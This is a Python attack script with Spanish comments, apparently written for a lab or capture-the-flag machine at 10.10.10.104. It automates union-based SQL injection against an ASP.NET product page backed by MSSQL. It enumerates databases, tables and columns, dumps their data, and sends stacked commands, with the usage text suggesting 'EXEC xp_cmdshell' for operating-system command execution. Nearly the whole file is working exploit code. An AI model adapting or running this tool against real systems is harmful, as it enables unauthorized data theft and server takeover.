#!/usr/bin/python3

import argparse, signal, sys
import requests
from prettytable import PrettyTable
from bs4 import BeautifulSoup
from pwn import *

# -- Variables globales
URL = "http://10.10.10.104/mvc"
# Variables del array de columnas
int_columns = 25
text_for_column = "NULL"
null_values = int_columns * [text_for_column]  # Seria el resultado de generar 25 NULL's en un array
# Valores por default de la web a evitar
array_web_avoid = ["Taillights - Battery-Powered", "Headlights - Dual-Beam", "Headlights - Weatherproof"]

# -- Clases del programa
# Colores usados
class Color:
    DARKCYAN = '\033[36m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

# Validamos si algún proceso fue bueno o malo
class BienMal:
    BIEN = Color.GREEN + "✔" + Color.END
    MAL = Color.RED + "✘" + Color.END

# -- Funciones del programa
# CTRL + C
def def_handler(sig, frame):
    print(Color.RED + "\n[!] Nos veemoooos...\n" + Color.END)
    exit(0)

signal.signal(signal.SIGINT, def_handler)

# Uso
def usage_my_rey():
    print("\n[+] Holiwis, así puedes usar el programa:\n")
    print("\t%s -f varible_mssql       : Ves el resultado de una variable del servicio MSSQL." % (sys.argv[0]))
    print("\t%s -f @@version\n" % (sys.argv[0]))
    print("\t%s -d                     : Listas todas las bases de datos del servicio." % (sys.argv[0]))
    print("\t%s -t                     : Listas todas las tablas de cada base de datos." % (sys.argv[0]))
    print("\t%s -t nombre_tabla        : Listas las tablas de una base de datos especifica." % (sys.argv[0]))
    print("\t%s -t Injection\n" % (sys.argv[0]))
    print("\t%s --command exec_mssql   : Ejecutas un comando valido contra el servicio MSSQL." % (sys.argv[0]))
    print("\t%s --command 'EXEC xp_cmdshell \"net user\";'\n" % (sys.argv[0]))
    print("\t%s --dump DB TABLE COLUMN : Dumpeas data especifica, X database, XY tabla, XYZ columna." % (sys.argv[0]))
    print("\t%s --dump Injection" % (sys.argv[0]))
    print("\t%s --dump Injection Product" % (sys.argv[0]))
    print("\t%s --dump Injection Product Name\n" % (sys.argv[0]))
    exit(0)

# Argumentos recibidos por el programa
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument('-f', '--field', dest='field', type=str, help="Variable que quieras ver del servicio MSSQL.")
    parse.add_argument('-d', '--dbs', dest='databases', action="store_true", help="En caso de querer listar las bases de datos.")
    parse.add_argument('-t', '--tables', dest='tables', nargs='?', const='default', default=False, help="Extraemos todas las tablas de las bases de datos, o una en especifico.")
    parse.add_argument('--command', dest='command', type=str, help="Ejecución de comandos MSSQL.")
    parse.add_argument('--dump', dest='dump', nargs='*', help="El completo, dumpeamos bases de datos concretas, tablas de esas bases de datos, columnas de las tablas y la data de esas columnas.")
    return parse.parse_args()

# Hacemos las peticiones enviando la inyección SQL (payload)
def send_payload(union_payload, payload, end_of_payload):
    # Actualizamos el valor de la posicion 2 (1 al empezar a contar desde 0) en el array por el valor de nuestro payload:
    null_values[1] = payload

    # Generamos una cadena separada por `,` con el valor actual del array:
    real_payload = ','.join(null_values)

    data_get = {
        # Simulamos:            "33 UNION .. NULL,...;-- -"
        "ProductSubCategoryId": "33 %s %s%s" % (union_payload, real_payload, end_of_payload)
    }
#    print(data_get['ProductSubCategoryId'])   # Comentado a proposito, es el que funciona como debug
    r = requests.get(URL + '/Product.aspx', params=data_get)
    soup = BeautifulSoup(r.content, 'html.parser')

    try:
        result_query = soup.find_all('td')[0].get_text()
        if result_query in array_web_avoid:
            err = 1
        elif "An unhandled exception was generated during" in result_query:
            err = 1
        else:
            err = 0
    except IndexError as e:
        result_query = ""
        err = 1

    return result_query, err

# Extraemos el valor de una variable del servicio SQL
def extract_field(field):
    print("[+] Extrayendo la variable %s del servicio SQL." % (Color.DARKCYAN + field + Color.END))

    union_payload = "UNION SELECT"
    end_of_payload = " ORDER BY 1;-- -"

    result_field, err = send_payload(union_payload, field, end_of_payload)

    # Extraemos el resultado del campo
    p2 = log.progress(field)
    if err:
        p2.failure(BienMal.MAL)
        print(Color.RED + "\n[-] Variable no encontrada en el servicio Microsoft SQL.\n" + Color.END)
        exit(1)
    elif len(result_field) >= 100:
        p2.success(Color.DARKCYAN + "\n" + result_field + Color.END)
    else:
        p2.success(Color.DARKCYAN + result_field + Color.END)

# Ejecutamos comandos validos en MSSQL.
def exec_command(command):

    data_get = {
        "ProductSubCategoryId": "33; " + command + ";-- -"
    }
    print("\n[+] Enviando: " + Color.DARKCYAN + "...=" + data_get['ProductSubCategoryId'] + Color.END)
    r = requests.get(URL + '/Product.aspx', params=data_get)

    if r.status_code == 200:
        print("\n[+] Listonessss.")
    else:
        print(Color.RED + "\n[-] Problemas al ejecutar ese comando, revisa que este bien escrito." + Color.END)

# Extraemos las bases de datos, si llega un argumento es por que vamos a dumpear las tablas.
def extract_databases(arg):
    print("[+] Extrayendo las bases de datos del servicio MSSQL.\n")

    array_dbs = []
    for db_num in range(10):
        union_payload = "UNION SELECT"
        payload = "DB_NAME(%d)" % (db_num)
        end_of_payload = " ORDER BY 1;-- -"

        db_name, err = send_payload(union_payload, payload, end_of_payload)

        if err:
            log.failure(BienMal.MAL)
            print(Color.RED + "\n[-] Problemas al dumpear las bases de datos, valida el contenido de la columna.\n" + Color.END)
            exit(1)

        # Extraemos db, cuando son vacias devuelve un espacio en latin, así que lo quitamos con `replace`:
        db_name = db_name.replace(u'\xa0', u'')
        if db_name:
            # Generamos un array con las bases de datos:
            array_dbs.append(db_name)
            p1 = log.progress("Base de datos [%d]" % (db_num))
            p1.success(db_name)

    if arg:
        array_dbs = set(array_dbs)  # Quitamos duplicados
        extract_tables(array_dbs)

    print()

def extract_tables(array_dbs):
    for database in array_dbs:
        print()
        p1 = log.progress("Dumpeando tablas de la base de datos '%s'" % (database))

        drawtable_header = PrettyTable(['Num', 'Tablas DB: %s' % (database)])
        drawtable_header.align = "l"  # Alineamos la tabla a la izquierda
        drawtable_header.align['Num'] = "c"  # Centramos la columna Num

        for table_num in range(0,50):
            union_payload = "UNION SELECT"
            payload = "table_name"
            end_of_payload = " FROM [%s].information_schema.tables ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -" % (database, table_num)

            table_name, err = send_payload(union_payload, payload, end_of_payload)

            if err:
                break
            elif table_name:
                drawtable_header.add_row([table_num+1, table_name])
                p1.status(table_name)

        p1.success(BienMal.BIEN)
        print(drawtable_header)

    print()

def extract_columns(database, table):
    p1 = log.progress("Dumpeando columnas de la tabla '%s' en la base de datos '%s'" % (table, database))
    print()
    drawtable_header = PrettyTable(['Num', 'Columnas'])
    drawtable_header.align = "l"  # Alineamos la tabla a la izquierda
    drawtable_header.align['Num'] = "c"  # Centramos la columna Num

    for column_num in range(100):
        union_payload = "UNION SELECT"
        payload = "column_name"
        end_of_payload = " FROM [%s].information_schema.columns WHERE table_name='%s' ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -" % (database, table, column_num)

        column_name, err = send_payload(union_payload, payload, end_of_payload)

        if err:
            break
        elif column_name:
            drawtable_header.add_row([column_num+1, column_name])
            p1.status(column_name)

    p1.success(BienMal.BIEN)
    print(drawtable_header)
    print()

def dump_columns(database, table, column):
    p1 = log.progress("Extrayendo valores de la columna '%s' en %s.%s" % (column, database, table))
    print()

    drawtable_header = PrettyTable(['Num', column])
    drawtable_header.align = "l"  # Alineamos la tabla a la izquierda
    drawtable_header.align['Num'] = "c"  # Centramos la columna Num

    for row in range(100):
        union_payload = "UNION SELECT"
        payload = column
        end_of_payload = " FROM [%s]..%s ORDER BY 1 OFFSET %d ROWS FETCH FIRST 1 ROWS ONLY;-- -" % (database, table, row)

        result, err = send_payload(union_payload, payload, end_of_payload)

        if err:
            break
        elif result:
            drawtable_header.add_row([row+1, result])
            p1.status(result)

    p1.success(BienMal.BIEN)
    print(drawtable_header)
    print()

if __name__ == '__main__':
    args = arguments()

    # En caso de querer ver el contenido de una variable
    if args.field:
        extract_field(args.field)

    # Listamos todas las dbs
    elif args.databases:
        extract_databases(arg=0)

    # Listamos las tablas
    elif args.tables:
        # Todas
        if args.tables == 'default':
            print(Color.DARKCYAN + "[+] Extrayendo todas las tablas de las bases de datos.\n" + Color.END)
            extract_databases(arg=1)
        # Una en concreto
        else:
            print("[+] Extrayendo tablas de la base de datos %s." % (Color.DARKCYAN + args.tables + Color.END))
            extract_tables([args.tables])

    elif args.dump:
        if len(args.dump) == 1:
            extract_tables([args.dump[0]])
        elif len(args.dump) == 2:
            extract_columns(args.dump[0], args.dump[1])
        elif len(args.dump) == 3:
            dump_columns(args.dump[0], args.dump[1], args.dump[2])
        else:
            usage_my_rey()

    elif args.command:
        exec_command(args.command)

    else:
        usage_my_rey()
